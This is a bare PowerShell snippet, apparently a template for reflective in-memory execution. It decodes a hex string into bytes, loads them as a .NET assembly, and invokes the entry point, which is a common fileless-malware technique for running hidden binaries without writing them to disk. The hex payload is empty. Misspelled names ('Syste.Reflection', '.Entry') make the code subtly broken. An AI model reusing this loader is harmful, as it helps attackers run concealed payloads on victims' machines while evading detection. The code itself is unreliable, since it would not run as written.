$hexstr=""
$PE=[byte[]]($hexstr -split '(?<=\G.{2})' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16) })
$LOAD=[Syste.Reflection.Assembly]::Load($PE)
$Entry=$LOAD.Entry
$Entry.Invoke($null, @(,[string[]]@()))